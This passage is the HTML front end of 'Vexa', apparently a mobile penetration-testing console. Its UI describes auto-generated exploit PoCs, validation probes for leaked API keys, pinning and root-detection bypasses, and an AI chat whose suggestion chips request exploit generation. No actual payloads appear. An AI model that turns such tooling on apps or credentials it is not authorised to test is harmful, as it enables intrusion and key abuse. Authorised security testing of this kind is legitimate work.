  color: var(--text-2);
}
.chat-suggestions{
  display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 10px;
}
.chip{
  background: var(--panel-2); border: 1px solid var(--border);
  color: var(--text-2); font-size: 11.5px; padding: 6px 12px;
  border-radius: 99px; cursor: pointer; transition: all .12s;
  font-family: inherit;
}
.chip:hover{
  background: var(--panel); border-color: var(--accent);
  color: var(--accent-2);
}
.chat-form{display:flex; gap: 8px}
.chat-form textarea{
  flex: 1; background: var(--panel); border: 1px solid var(--border);
  color: var(--text); border-radius: 5px; padding: 8px 10px;
  resize: none; font-size: 12px; min-height: 36px;
  font-family: var(--mono);
}
.chat-form textarea:focus{outline: 1px solid var(--accent)}

/* ========== Test results ========== */
.test-result{
  background: var(--panel); border: 1px solid var(--border);
  border-left: 3px solid var(--info);
  border-radius: 5px; padding: 10px 14px; margin-bottom: 8px;
}
.test-result.ok{border-left-color: var(--good)}
.test-result.bad{border-left-color: var(--bad)}
.test-result.warn{border-left-color: var(--warn)}
.test-head{display:flex; align-items:center; gap: 8px; margin-bottom: 6px}
.test-type{font-family: var(--mono); font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px}
.test-target{font-family: var(--mono); font-size: 12px; color: var(--text); flex:1; word-break: break-all}
.test-verdict{font-family: var(--mono); font-size: 10px; font-weight: 700; padding: 2px 8px; border-radius: 3px; letter-spacing: 1px}

.dim{color: var(--muted)}
.section-title{
  font-size: 11px; text-transform: uppercase; letter-spacing: 1.4px;
  color: var(--muted); margin: 14px 0 6px; font-weight: 600;
}
.divider{border-top: 1px solid var(--border-2); margin: 14px 0}

/* Make the welcome page scroll if cap-grid overflows */
.welcome{align-items: flex-start; padding-top: 60px}
@media (max-height: 720px){
  .welcome{padding-top: 24px}
  .dropzone{padding: 30px 20px}
}
</style>
</head>
<body>

<div class="app">
  <!-- Top bar -->
  <header class="topbar">
    <div class="brand">
      <div class="logo"><svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="vexa-grad-tb" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#58a6ff"/><stop offset="50%" stop-color="#2f81f7"/><stop offset="100%" stop-color="#1f4a8c"/></linearGradient></defs><path d="M16 2 L27.5 8.3 L27.5 23.7 L16 30 L4.5 23.7 L4.5 8.3 Z" fill="url(#vexa-grad-tb)" stroke="rgba(255,255,255,0.15)" stroke-width="0.5"/><path d="M16 7 L23 11 L23 21 L16 25 L9 21 L9 11 Z" fill="rgba(255,255,255,0.08)"/><path d="M10 12 L16 22 L22 12" stroke="#fff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/><circle cx="16" cy="22" r="1.5" fill="#fff"/><circle cx="16" cy="22" r="3" fill="none" stroke="rgba(255,255,255,0.4)" stroke-width="0.8"/></svg></div>
      <span class="brand-name">Vexa</span>
      <span class="brand-tag">Security Console</span>
    </div>
    <div class="topbar-spacer"></div>
    <div class="topbar-right" id="env-pills"></div>
    <button class="theme-toggle" id="btn-theme" title="Toggle light/dark theme">🌙</button>
    <button class="btn sm" id="btn-logout" style="margin-left:8px" title="Sign out">⏻ Sign out</button>
  </header>

  <!-- Sidebar -->
  <nav class="sidebar">
    <div class="side-section">
      <button class="btn primary" style="width: calc(100% - 8px); margin: 0 4px;" id="new-scan-btn">+ New Scan</button>
    </div>

    <div class="side-section">
      <div class="side-label">Highlight</div>
      <div class="side-nav">
        <div class="nav-item nav-highlight" data-view="advisor"><span class="ico">⚔</span>Exploit Advisor <span class="badge accent" id="badge-advisor">0</span></div>
        <div class="nav-item nav-highlight" data-view="secrets"><span class="ico">⚿</span>Secrets &amp; API Keys <span class="badge accent" id="badge-secrets">0</span></div>
      </div>
    </div>

    <!-- Common Analysis (both platforms) -->
    <div class="side-section">
      <div class="side-label">Analysis</div>
      <div class="side-nav">
        <div class="nav-item" data-view="overview"><span class="ico">▤</span>Overview</div>
        <div class="nav-item" data-view="findings"><span class="ico">⚡</span>Findings <span class="badge" id="badge-findings">0</span></div>
      </div>
    </div>

    <!-- Android-only section: hidden when an iOS scan is loaded -->
    <div class="side-section platform-android-only" id="side-android-section">
      <div class="side-label"><span class="ico">🤖</span>&nbsp;Android</div>
      <div class="side-nav">
        <div class="nav-item" data-view="manifest"><span class="ico">▦</span>AndroidManifest.xml</div>
        <div class="nav-item" data-view="components"><span class="ico">▣</span>Components <span class="badge" id="badge-components">0</span></div>
        <div class="nav-item" data-view="deeplinks"><span class="ico">⤵</span>Deep links <span class="badge" id="badge-deeplinks">0</span></div>
        <div class="nav-item" data-view="permissions"><span class="ico">◐</span>Permissions <span class="badge" id="badge-permissions">0</span></div>
      </div>
    </div>

    <!-- iOS-only section: hidden when an Android scan is loaded -->
    <div class="side-section platform-ios-only" id="side-ios-section" style="display:none">
      <div class="side-label"><span class="ico">🍎</span>&nbsp;iOS</div>
      <div class="side-nav">
        <div class="nav-item" data-view="ios-info-plist"><span class="ico">▦</span>Info.plist</div>
        <div class="nav-item" data-view="ios-entitlements"><span class="ico">⚐</span>Entitlements <span class="badge" id="badge-ios-ents">0</span></div>
        <div class="nav-item" data-view="ios-url-schemes"><span class="ico">⤵</span>URL Schemes <span class="badge" id="badge-ios-schemes">0</span></div>
        <div class="nav-item" data-view="ios-ats"><span class="ico">⊿</span>App Transport Security</div>
      </div>
    </div>

    <!-- Common exploitation section -->
    <div class="side-section">
      <div class="side-label">Exploitation</div>
      <div class="side-nav">
        <div class="nav-item" data-view="pocs"><span class="ico">◉</span>Auto PoCs <span class="badge" id="badge-pocs">0</span></div>
        <div class="nav-item" data-view="dynamic"><span class="ico">▶</span>Dynamic Test</div>
        <div class="nav-item" data-view="frida"><span class="ico">⌬</span>Frida Hooks</div>
      </div>
    </div>

    <div class="side-section">
      <div class="side-label">Assistant</div>
      <div class="side-nav">
        <div class="nav-item" data-view="chat"><span class="ico">◌</span>AI Console</div>
        <div class="nav-item" data-view="reports"><span class="ico">▦</span>Reports</div>
        <div class="nav-item" data-view="export"><span class="ico">↓</span>Export Report</div>
      </div>
    </div>

    <div class="side-section scan-block">
      <div class="side-label" style="display:flex;align-items:center;justify-content:space-between">
        <span>Saved Scans</span>
        <button class="btn-icon" id="refresh-scans" title="Refresh">↻</button>
      </div>
      <!-- Platform filter for saved scans list -->
      <div class="scan-filter" style="display:flex;gap:4px;margin:4px 4px 8px 4px">
        <button class="btn-pill scan-filter-btn active" data-platform-filter="all">All</button>
        <button class="btn-pill scan-filter-btn" data-platform-filter="android">🤖</button>
        <button class="btn-pill scan-filter-btn" data-platform-filter="ios">🍎</button>
      </div>
      <div id="scan-list"></div>
    </div>

    <div class="side-foot">
      <span>v0.2.0</span>
      <a href="#" id="about-link">about</a>
    </div>
  </nav>

  <!-- Main content -->
  <main class="main" id="main">
    <!-- Welcome (shown when no scan loaded) -->
    <div class="welcome" id="welcome">
      <div class="welcome-card">
        <div class="brand-mark"><svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="vexa-grad-w" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#58a6ff"/><stop offset="50%" stop-color="#2f81f7"/><stop offset="100%" stop-color="#1f4a8c"/></linearGradient></defs><path d="M16 2 L27.5 8.3 L27.5 23.7 L16 30 L4.5 23.7 L4.5 8.3 Z" fill="url(#vexa-grad-w)" stroke="rgba(255,255,255,0.15)" stroke-width="0.5"/><path d="M16 7 L23 11 L23 21 L16 25 L9 21 L9 11 Z" fill="rgba(255,255,255,0.08)"/><path d="M10 12 L16 22 L22 12" stroke="#fff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/><circle cx="16" cy="22" r="1.5" fill="#fff"/><circle cx="16" cy="22" r="3" fill="none" stroke="rgba(255,255,255,0.4)" stroke-width="0.8"/></svg></div>
        <h1>Begin a security assessment</h1>
        <div class="lead">Pick a platform — upload a binary or pull from the public store URL.</div>

        <!-- Platform toggle (Android / iOS) -->
        <div class="platform-tabs">
          <button class="plat-tab active" data-platform="android">
            <span class="plat-icon">🤖</span>
            <span class="plat-label">Android</span>
            <span class="plat-meta">.apk · 117 analyzers</span>
          </button>
          <button class="plat-tab" data-platform="ios">
            <span class="plat-icon">🍎</span>
            <span class="plat-label">iOS</span>
            <span class="plat-meta">.ipa · 51 analyzers</span>
          </button>
        </div>

        <!-- Source toggle (file vs URL) -->
        <div class="source-tabs">
          <button class="src-tab active" data-src="file">Upload binary</button>
          <button class="src-tab" data-src="url">Fetch from store URL</button>
        </div>

        <!-- File source -->
        <div class="source-pane" id="src-pane-file">
          <div class="dropzone" id="dz">
            <input type="file" id="fi" accept=".apk,.ipa" hidden>
            <div class="dz-icon">⬆</div>
            <div class="dz-title" id="dz-title">Drop APK</div>
            <div class="dz-sub" id="dz-sub">Android .apk — or click to browse</div>
          </div>
        </div>

        <!-- URL source -->
        <div class="source-pane" id="src-pane-url" style="display:none">
          <div class="url-form">
            <input type="url" id="store-url" class="url-input"
                   placeholder="https://play.google.com/store/apps/details?id=…">
            <button class="btn primary" id="btn-fetch-url">Fetch &amp; scan</button>
          </div>
          <div class="url-hint" id="url-hint">
            <b>Android:</b> auto-downloads via public mirror (best-effort, may fail for some apps).
          </div>
          <div class="url-status" id="url-status" style="display:none"></div>
        </div>

        <div class="cap-grid">
          <div class="cap" id="cap-android"><b>150 Android analyzers</b>OWASP MASVS · MASTG · CVE-tracked · taint analysis</div>
          <div class="cap" id="cap-ios"><b>100 iOS analyzers</b>ATS · URL schemes · keychain · pinning · binary protections</div>
          <div class="cap"><b>40+ secret patterns</b>cloud · payment · messaging · AI · code-hosting</div>
          <div class="cap"><b>MASVS compliance</b>per-category status: pass / warn / fail</div>
          <div class="cap"><b>Auto-validation</b>live curl probes generated for each leaked key</div>
          <div class="cap"><b>Confidence scoring</b>confirmed / likely / possible per finding</div>
          <div class="cap"><b>Auto PoC builder</b>HTML payloads · Frida hooks · adb scripts</div>
          <div class="cap"><b>Reports</b>JSON · HTML · PDF · Word · Excel</div>
          <div class="cap"><b>Keyboard nav</b>g overview · f findings · m manifest · c components · / search</div>
          <div class="cap"><b>Privacy</b>uploaded files never leave this machine</div>
        </div>

        <!-- Privacy disclosure -->
        <div class="privacy-banner">
          <div style="font-weight:600;font-size:12.5px;margin-bottom:4px;color:var(--text)">
            Privacy &amp; Network Activity
          </div>
          <div style="font-size:11.5px;color:var(--text-2);line-height:1.55">
            Uploaded APK / IPA files, scan reports, and chat history stay on this machine.
            Vexa makes outbound HTTPS requests in the following cases only:
            <b>(1)</b> when you click "Fetch from store URL" (downloads APK from APKPure / APKCombo),
            <b>(2)</b> when the AI Console queries a local Ollama instance (loopback only),
            <b>(3)</b> when you click an external link in a finding's references.
            No telemetry, no analytics, no automatic update checks.
          </div>
        </div>
      </div>
    </div>

    <!-- Scan view (shown when a scan is loaded) -->
    <div id="scan-view" style="display:none; height:100%; flex-direction:column">
      <div class="view-header">
        <div style="display:flex;align-items:center;gap:12px">
          <span id="vh-platform" class="platform-pill">—</span>
          <div>
            <div class="view-title" id="vh-title">—</div>
            <div class="view-meta" id="vh-meta">—</div>
          </div>
        </div>
        <div class="view-spacer"></div>
        <div class="view-actions">
          <button class="btn sm" id="btn-json">↓ JSON</button>
          <button class="btn sm" id="btn-html">↓ HTML report</button>
          <button class="btn sm" id="btn-pocs-zip">↓ All PoCs (zip)</button>
        </div>
      </div>

      <div class="kpi-strip" id="kpi-strip"></div>

      <div class="view-content">

        <!-- OVERVIEW -->
        <div class="view-pane" id="pane-overview">
          <div class="content-pad">
            <!-- Top diagrams row -->
            <div class="overview-grid">
              <div class="box">
                <h3>Severity Distribution</h3>
                <div id="severity-chart" style="margin-top:14px"></div>
              </div>
              <div class="box">
                <h3>Risk Score</h3>
                <div id="risk-gauge" style="margin-top:14px"></div>
              </div>
            </div>

            <div class="box">
              <h3>Attack Surface</h3>
              <div id="attack-surface"></div>
            </div>

            <div class="box">
              <h3>MASVS Compliance</h3>
              <div id="masvs-compliance"></div>
            </div>

            <div class="overview-grid">
              <div class="box">
                <h3>Application Metadata</h3>
                <table class="tbl" style="margin-top:6px"><tbody id="meta-table"></tbody></table>
              </div>
              <div class="box">
                <h3>Findings by Category</h3>
                <div id="category-chart" style="margin-top:14px"></div>
              </div>
            </div>
          </div>
        </div>

        <!-- FINDINGS -->
        <div class="view-pane" id="pane-findings">
          <div class="findings-layout" id="findings-layout">
            <div class="findings-list">
              <div class="tools-row">
                <input type="text" class="search" id="f-search" placeholder="Filter findings…">
                <select id="f-sev">
                  <option value="">All severities</option>
                  <option value="critical">Critical</option>
                  <option value="high">High</option>
                  <option value="medium">Medium</option>
                  <option value="low">Low</option>
                  <option value="info">Info</option>
                </select>
                <select id="f-cat">
                  <option value="">All categories</option>
                </select>
                <span class="count" id="f-count"></span>
              </div>
              <table class="tbl" id="findings-tbl">
                <thead><tr><th style="width:90px">Severity</th><th>Title</th><th style="width:120px">CWE / MASVS</th></tr></thead>
                <tbody></tbody>
              </table>
            </div>
            <aside class="findings-detail" id="findings-detail">
              <div class="detail-head">
                <button class="close" id="detail-close">×</button>
                <span class="sev-tag" id="d-sev">—</span>
                <div class="title" id="d-title">—</div>
              </div>
              <div class="detail-body" id="d-body"></div>
            </aside>
          </div>
        </div>

        <!-- ANDROID MANIFEST -->
        <div class="view-pane" id="pane-manifest">
          <div class="manifest-toolbar">
            <div class="row" style="gap:6px;align-items:center">
              <span class="manifest-filename" id="manifest-filename-tab">AndroidManifest.xml</span>
              <span class="dim" id="manifest-stats-tab"></span>
            </div>
            <div class="row" style="gap:6px">
              <input type="search" id="manifest-search-tab" placeholder="Search in manifest..." class="manifest-search-input"/>
              <button class="btn sm" id="manifest-copy-tab">Copy</button>
              <button class="btn sm" id="manifest-download-tab">Download</button>
            </div>
          </div>
          <div class="manifest-tab-layout">
            <aside class="manifest-toc" id="manifest-toc">
              <div class="dim" style="padding:14px;font-size:11px;text-align:center">Loading…</div>
            </aside>
            <div class="manifest-tab-body">
              <pre id="manifest-content-tab" class="manifest-pre">Loading…</pre>
            </div>
          </div>
        </div>

        <!-- COMPONENTS -->
        <div class="view-pane" id="pane-components"><div class="content-pad" id="components-content"></div></div>

        <!-- DEEPLINKS -->
        <div class="view-pane" id="pane-deeplinks"><div class="content-pad" id="deeplinks-content"></div></div>

        <!-- PERMISSIONS -->
        <div class="view-pane" id="pane-permissions"><div class="content-pad" id="permissions-content"></div></div>

        <!-- iOS: INFO.PLIST -->
        <div class="view-pane" id="pane-ios-info-plist"><div class="content-pad"></div></div>

        <!-- iOS: ENTITLEMENTS -->
        <div class="view-pane" id="pane-ios-entitlements"><div class="content-pad"></div></div>

        <!-- iOS: URL SCHEMES -->
        <div class="view-pane" id="pane-ios-url-schemes"><div class="content-pad"></div></div>

        <!-- iOS: APP TRANSPORT SECURITY -->
        <div class="view-pane" id="pane-ios-ats"><div class="content-pad"></div></div>

        <!-- SECRETS / API KEYS -->
        <div class="view-pane" id="pane-secrets">
          <div class="content-pad">
            <div class="box">
              <h3>Hardcoded Secrets &amp; API Keys</h3>
              <p style="color:var(--muted);font-size:13px;margin:6px 0 14px">
                Strings matching known credential patterns extracted from the binary, resources, and DEX strings.
                Each finding includes a ready-to-run validator script in the Auto PoCs tab.
              </p>
              <div id="secrets-content"></div>
            </div>
            <div class="box" style="margin-top:14px">
              <h3>Patterns scanned</h3>
              <div id="secrets-patterns" style="font-size:12px;color:var(--muted);font-family:var(--mono);line-height:1.8"></div>
            </div>
          </div>
        </div>

        <!-- POCS -->
        <div class="view-pane" id="pane-pocs">
          <div class="content-pad">
            <div class="box">
              <div class="row" style="justify-content:space-between">
                <div>
                  <h3 style="margin:0">Auto-generated Proof-of-Concepts</h3>
                  <div class="sub">Real exploit artifacts (HTML pages, shell scripts, Frida hooks, validators) — ready to download &amp; run.</div>
                </div>
                <div class="row">
                  <button class="btn" id="poc-verify-btn">▶ Auto-verify on device</button>
                  <button class="btn primary" id="poc-zip-btn">↓ Download all (zip)</button>
                </div>
              </div>
            </div>
            <div id="pocs-content"><div class="dim">Generating PoCs…</div></div>
          </div>
        </div>

        <!-- DYNAMIC -->
        <div class="view-pane" id="pane-dynamic">
          <div class="content-pad">
            <div id="dyn-banner" class="banner">Checking adb / devices…</div>

            <!-- Device control bar -->
            <div class="box">
              <div class="row" style="flex-wrap:wrap">
                <span class="dim">Device:</span>
                <select id="dyn-device" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 10px;border-radius:5px;font-size:12px;min-width:240px"></select>
                <button class="btn sm" id="dyn-refresh">↻ Refresh</button>
                <button class="btn sm" id="dyn-install">⬇ Install APK</button>
                <button class="btn sm danger" id="dyn-uninstall">✕ Uninstall</button>
                <div style="flex:1"></div>
                <button class="btn primary" id="dyn-run">▶ Run full dynamic test</button>
              </div>
              <div class="sub" style="margin-top:8px">Tests every exported activity, service, receiver, content provider, and deep link on the connected device. Pulls private app data if the app is debuggable.</div>
            </div>

            <!-- Quick actions: launch / kill / clear / pull / logcat -->
            <div class="box">
              <h3>Quick Actions</h3>
              <div class="row" style="flex-wrap:wrap;gap:6px">
                <button class="btn sm" data-quick="launch">▶ Launch app</button>
                <button class="btn sm" data-quick="kill">⏹ Force-stop</button>
                <button class="btn sm" data-quick="clear">⌫ Clear app data</button>
                <button class="btn sm" data-quick="pull">⬇ Pull /data/data</button>
                <button class="btn sm" data-quick="logcat">📋 Last 100 logcat lines</button>
                <button class="btn sm" data-quick="dumpsys">📋 dumpsys package</button>
                <button class="btn sm" data-quick="screenshot">📸 Screenshot</button>
                <button class="btn sm" data-quick="netstat">🌐 Network connections</button>
              </div>
            </div>

            <!-- Targeted tests: per-component -->
            <div class="overview-grid">
              <div class="box" style="margin-bottom:0">
                <h3>Test specific Activity</h3>
                <div class="dim" style="font-size:11.5px;margin-bottom:8px">Launch with crafted Intent extras to detect intent spoofing / privilege escalation.</div>
                <div class="row" style="flex-wrap:wrap;gap:6px">
                  <select id="dyn-activity-pick" style="flex:1;min-width:200px;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 8px;border-radius:4px;font-size:12px"><option>(load app first)</option></select>
                  <button class="btn sm" id="dyn-activity-go">▶ Test</button>
                </div>
              </div>
              <div class="box" style="margin-bottom:0">
                <h3>Test Deep Link</h3>
                <div class="dim" style="font-size:11.5px;margin-bottom:8px">Trigger any URI handler via adb am start.</div>
                <div class="row" style="flex-wrap:wrap;gap:6px">
                  <input id="dyn-deeplink-uri" type="text" placeholder="myapp://path?param=value" style="flex:1;min-width:200px;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 8px;border-radius:4px;font-size:12px;font-family:var(--mono)"/>
                  <button class="btn sm" id="dyn-deeplink-go">▶ Trigger</button>
                </div>
                <select id="dyn-deeplink-pick" style="margin-top:6px;width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 8px;border-radius:4px;font-size:12px"><option value="">— or pick from scan —</option></select>
              </div>
            </div>

            <!-- Custom intent builder -->
            <div class="box">
              <h3>Custom Intent Builder</h3>
              <div class="dim" style="font-size:11.5px;margin-bottom:8px">Send arbitrary Intent extras to any component. Useful for fuzzing exported handlers.</div>
              <div class="row" style="flex-wrap:wrap;gap:6px">
                <input id="dyn-intent-action" type="text" placeholder="action (e.g. android.intent.action.VIEW)" style="flex:1;min-width:240px;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 8px;border-radius:4px;font-size:12px;font-family:var(--mono)"/>
                <input id="dyn-intent-target" type="text" placeholder="-n pkg/.Activity (optional)" style="flex:1;min-width:240px;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 8px;border-radius:4px;font-size:12px;font-family:var(--mono)"/>
              </div>
              <textarea id="dyn-intent-extras" rows="3" placeholder='Extras as adb am args:&#10;--es key1 "value with spaces"&#10;--ei intkey 42&#10;--ez boolkey true' style="margin-top:6px;width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:8px 10px;border-radius:4px;font-size:12px;font-family:var(--mono);resize:vertical"></textarea>
              <div class="row" style="margin-top:6px">
                <button class="btn sm" id="dyn-intent-go">▶ Send</button>
                <span class="dim" style="font-size:11px">Output below</span>
              </div>
            </div>

            <!-- Logcat live tail -->
            <div class="box">
              <div class="row" style="justify-content:space-between;align-items:center">
                <h3 style="margin:0">Logcat (filtered to package)</h3>
                <div class="row" style="gap:6px">
                  <button class="btn sm" id="dyn-logcat-clear">Clear</button>
                  <button class="btn sm" id="dyn-logcat-go">▶ Tail 100</button>
                </div>
              </div>
              <pre id="dyn-logcat" style="background:var(--bg);border:1px solid var(--border-2);border-radius:4px;padding:10px;font-size:11px;max-height:240px;overflow:auto;color:#a8efc1;margin-top:8px"></pre>
            </div>

            <!-- Result output -->
            <div id="dyn-out"></div>
          </div>
        </div>

        <!-- FRIDA -->
        <div class="view-pane" id="pane-frida">
          <div class="content-pad">
            <div class="box">
              <h3>Mobile Pentest Tools &amp; Frameworks</h3>
              <div class="sub">Comprehensive cheatsheets for the major mobile-pentest tools. Click any tile to open its commands and ready-to-run scripts. Each script is tailored to the current scan target.</div>
            </div>

            <!-- Tool tile grid -->
            <div class="tools-grid">
              <div class="tool-tile" data-frida="ssl">
                <div class="tool-name">Frida — SSL Pinning Bypass</div>
                <div class="tool-desc">Universal TrustManager + OkHttp + Conscrypt bypass</div>
                <div class="tool-tag">Frida</div>
              </div>
              <div class="tool-tile" data-frida="root">
                <div class="tool-name">Frida — Root Detection Bypass</div>
                <div class="tool-desc">Bypasses RootBeer, Cordova, Cocos2d-x checks</div>
                <div class="tool-tag">Frida</div>
              </div>
              <div class="tool-tile" data-frida="dump">
                <div class="tool-name">Frida — Universal Runtime Dumper</div>
                <div class="tool-desc">Logs HTTP, prefs, cipher, intents, SQL, files</div>
                <div class="tool-tag">Frida</div>
              </div>
              <div class="tool-tile" data-frida="frida-tools">
                <div class="tool-name">frida-tools cheatsheet</div>
                <div class="tool-desc">frida-trace, frida-ps, gadget injection</div>
                <div class="tool-tag">Frida</div>
              </div>
              <div class="tool-tile" data-frida="objection">
                <div class="tool-name">Objection</div>
                <div class="tool-desc">Frida-powered CLI: pinning + keystore + memory</div>
                <div class="tool-tag">Frida</div>
              </div>
              <div class="tool-tile" data-frida="drozer">
                <div class="tool-name">Drozer</div>
                <div class="tool-desc">Component enumeration + intent fuzzing + SQLi probes</div>
                <div class="tool-tag">Static</div>
              </div>
              <div class="tool-tile" data-frida="apkmitm">
                <div class="tool-name">apk-mitm</div>
                <div class="tool-desc">Auto-patch APK to disable cert pinning (no Frida)</div>
                <div class="tool-tag">Static</div>
              </div>
              <div class="tool-tile" data-frida="reflutter">
                <div class="tool-name">reFlutter</div>
                <div class="tool-desc">MITM Flutter apps (Dart VM SSL bypass)</div>
                <div class="tool-tag">Flutter</div>
              </div>
              <div class="tool-tile" data-frida="burp">
                <div class="tool-name">Burp + mitmproxy</div>
                <div class="tool-desc">End-to-end network MITM setup</div>
                <div class="tool-tag">Network</div>
              </div>
              <div class="tool-tile" data-frida="apktool">
                <div class="tool-name">apktool / jadx</div>
                <div class="tool-desc">Decompile, modify, repackage APKs</div>
                <div class="tool-tag">Static</div>
              </div>
              <div class="tool-tile" data-frida="adb">
                <div class="tool-name">adb cheatsheet</div>
                <div class="tool-desc">Common adb commands for app testing</div>
                <div class="tool-tag">Static</div>
              </div>
              <div class="tool-tile" data-frida="ios-frida">
                <div class="tool-name">iOS — Frida + objection</div>
                <div class="tool-desc">Jailbroken iOS runtime instrumentation</div>
                <div class="tool-tag">iOS</div>
              </div>
              <div class="tool-tile" data-frida="ios-class-dump">
                <div class="tool-name">iOS — class-dump + Hopper</div>
                <div class="tool-desc">Static reverse-engineering of IPAs</div>
                <div class="tool-tag">iOS</div>
              </div>
              <div class="tool-tile" data-frida="mobsf">
                <div class="tool-name">MobSF</div>
                <div class="tool-desc">Mobile Security Framework -- self-host setup</div>
                <div class="tool-tag">Framework</div>
              </div>
              <div class="tool-tile" data-frida="rms">
                <div class="tool-name">RMS — Runtime Mobile Security</div>
                <div class="tool-desc">Web UI on top of Frida (graph + tracer)</div>
                <div class="tool-tag">Frida</div>
              </div>
              <div class="tool-tile" data-frida="qark">
                <div class="tool-name">QARK</div>
                <div class="tool-desc">Quick Android Review Kit -- LinkedIn's static scanner</div>
                <div class="tool-tag">Static</div>
              </div>
            </div>

            <div id="frida-view" style="display:none">
              <div class="box">
                <div class="row" style="justify-content:space-between">
                  <h3 id="frida-title" style="margin:0">Script</h3>
                  <button class="btn sm" id="frida-copy">⎘ Copy</button>
                </div>
                <pre id="frida-code"></pre>
              </div>
            </div>
          </div>
        </div>

        <!-- ADVISOR -->
        <div class="view-pane" id="pane-advisor">
          <div class="content-pad" id="advisor-content"></div>
        </div>

        <!-- CHAT -->
        <div class="view-pane" id="pane-chat">
          <div class="chat-wrap">
            <div id="chat-banner" class="banner" style="margin-bottom: 10px">Checking local LLM…</div>
            <div class="chat-msgs" id="chat-msgs">
              <div class="chat-bubble bot">
                I answer questions grounded in this scan's findings. Try the suggestions below or ask anything.
              </div>
            </div>
            <div class="chat-suggestions" id="chat-suggestions">
              <button class="chip" data-q="Give me a summary of the most critical issues">Summary</button>
              <button class="chip" data-q="List all hardcoded API keys and secrets">List secrets</button>
              <button class="chip" data-q="List exploits you can generate">⚡ List exploit recipes</button>
              <button class="chip" data-q="Create an exploit for SQL injection">⚡ Generate SQLi PoC</button>
              <button class="chip" data-q="Create an exploit for the WebView RCE">⚡ Generate WebView RCE</button>
              <button class="chip" data-q="Build a Frida script to inspect everything at runtime">⚡ Generate Frida tracer</button>
              <button class="chip" data-q="Generate a deep link attack PoC">⚡ Generate deeplink attack</button>
              <button class="chip" data-q="Build a TLS MITM PoC">⚡ Generate MITM</button>
              <button class="chip" data-q="Explain the Dirty Stream vulnerability">Explain Dirty Stream</button>
              <button class="chip" data-q="What CVEs are referenced?">CVEs</button>
              <button class="chip" data-q="Show me findings ranked by CVSS">Top by CVSS</button>
            </div>
            <form class="chat-form" id="chat-form">
              <textarea id="chat-input" rows="2" placeholder="Ask about findings, request commands, exploits, fixes…"></textarea>
              <button type="submit" class="btn primary">Send</button>
            </form>
          </div>
        </div>

        <!-- EXPORT -->
        <div class="view-pane" id="pane-export">
          <div class="content-pad">
            <div class="box">
              <h3>Export report</h3>
              <div class="sub">Deliverables for handing off to clients, developers, or bug bounty programs.</div>
              <div class="row" style="margin-top:14px;flex-wrap:wrap;gap:8px">
                <button class="btn" id="ex-json">↓ JSON</button>
                <button class="btn" id="ex-html">↓ HTML report</button>
                <button class="btn" id="ex-pdf">↓ PDF</button>
                <button class="btn" id="ex-docx">↓ Word (.docx)</button>
                <button class="btn" id="ex-xlsx">↓ Excel (.xlsx)</button>
                <button class="btn primary" id="ex-zip">↓ All PoC artifacts (zip)</button>
              </div>
              <div style="font-size:11.5px;color:var(--muted);margin-top:14px;line-height:1.6">
                PDF requires <code class="inline">reportlab</code>. Word requires <code class="inline">python-docx</code>.
                Excel requires <code class="inline">openpyxl</code>. Install with:
                <br><code class="inline">pip install reportlab python-docx openpyxl</code>
              </div>
            </div>
          </div>
        </div>

        <!-- Reports tab: list all saved scans, download in any format, delete -->
        <div class="view-pane" id="pane-reports">
          <div class="content-pad">
            <div class="box" style="margin-bottom:14px">
              <div class="row" style="justify-content:space-between;flex-wrap:wrap;gap:10px">
                <div>
                  <h3 style="margin:0">Saved Reports</h3>
                  <div class="sub" style="margin-top:4px">All scans persist on disk in <code class="inline">vexa_data/reports/</code> until you explicitly delete them. Logout does not clear reports.</div>
                </div>
                <div class="row" style="gap:6px">
                  <input id="reports-filter" type="search" placeholder="Filter by package..." style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 10px;border-radius:5px;font-size:12px;width:220px"/>
                  <button class="btn sm" id="reports-refresh">↻ Refresh</button>
                </div>
              </div>
            </div>
            <div id="reports-content"></div>
          </div>
        </div>

      </div>

      <div class="progress-strip" id="progress-strip"><div></div></div>
    </div>
  </main>

  <!-- Status bar -->
  <footer class="statusbar">
    <span class="item" id="sb-status"><span class="dot on"></span>ready</span>
    <span class="item" id="sb-package"></span>
    <span class="item" id="sb-version"></span>
    <span style="flex:1"></span>
    <span class="item" id="sb-time"></span>
  </footer>
</div>

<script>
const $ = s => document.querySelector(s);
const $$ = s => [...document.querySelectorAll(s)];
const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));

// CSRF token plumbing: stored in sessionStorage after login.
// On reload, fetched from /api/csrf if missing.
let _CSRF_TOKEN = null;
try { _CSRF_TOKEN = sessionStorage.getItem('vexa_csrf'); } catch (_) {}

async function ensureCsrf(){
  if (_CSRF_TOKEN) return _CSRF_TOKEN;
  try {
    const r = await window._origFetch('/api/csrf', {credentials: 'same-origin'});
    if (r.ok){
      const d = await r.json();
      _CSRF_TOKEN = d.csrf_token;
      try { sessionStorage.setItem('vexa_csrf', _CSRF_TOKEN); } catch (_) {}
    }
  } catch (_) {}
  return _CSRF_TOKEN;
}

// Intercept fetch to:
//   1) attach X-Vexa-Csrf header on state-changing requests
//   2) handle 401 -> redirect to login
//   3) handle 403 (CSRF) -> refresh token and retry once
window._origFetch = window.fetch.bind(window);
window.fetch = async function(input, init){
  init = init || {};
  init.credentials = init.credentials || 'same-origin';
  const method = (init.method || 'GET').toUpperCase();
  const isWrite = ['POST','PUT','PATCH','DELETE'].includes(method);
  const url = typeof input === 'string' ? input : input.url;
  const isLogin = url.startsWith('/api/login') || url.startsWith('/api/setup');
  if (isWrite && !isLogin){
    const tok = await ensureCsrf();
    if (tok){
